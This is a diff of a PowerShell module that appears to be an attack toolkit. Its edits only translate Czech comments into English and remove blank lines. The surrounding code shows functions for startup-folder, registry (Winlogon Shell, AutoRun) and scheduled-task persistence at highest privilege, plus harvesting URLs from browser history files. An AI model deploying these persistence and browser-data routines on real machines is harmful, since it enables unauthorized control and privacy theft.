@@ -145,7 +145,7 @@ cd "$env:userprofile"
 Export-ModuleMember -Function getautostart
 Set-Alias -Name getautostart -Value getautostart
 
-# musis byt admin !
+# need admin !!
 function persistence {
     param(
 		[string]$processName
@@ -158,7 +158,7 @@ new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Star
 Export-ModuleMember -Function persistence
 Set-Alias -Name persistence -Value persistence
 
-# musis byt admin !
+# need admin !!
 function persistence-xclear {
 Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore 
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -ErrorAction Ignore
@@ -199,7 +199,7 @@ del "$env:userprofile\enableprivs.exe" -force
 Export-ModuleMember -Function privileges-unlock
 Set-Alias -Name privileges-unlock -Value privileges-unlock
 
-# musis byt admin !
+# need admin !!
 function persistence-tskschld {
     param(
 		[string]$processName,
@@ -215,7 +215,6 @@ function persistence-tskschld {
 $action = New-ScheduledTaskAction -Execute "$Request"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$tname" -User "$user" -Password "$pass" -RunLevel Highest
-
 }
 Export-ModuleMember -Function persistence-tskschld
 Set-Alias -Name "persistence-tskschld" -Value persistence-tskschld
@@ -284,7 +283,6 @@ function getbrowserdata {
         [Parameter(Position = 1, Mandatory = $False)]
         [string]$DataType = "history" # Defaultně "history"
     ) 
-
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
     $browserPaths = @{
         chrome = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
@@ -294,7 +292,6 @@ function getbrowserdata {
     foreach ($Browser in $browserPaths.Keys) {
         $Path = $browserPaths[$Browser]       
         if (Test-Path $Path) {
-            # Načti data z příslušného souboru historie
             $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique
             $Value | ForEach-Object {
                 New-Object -TypeName PSObject -Property @{
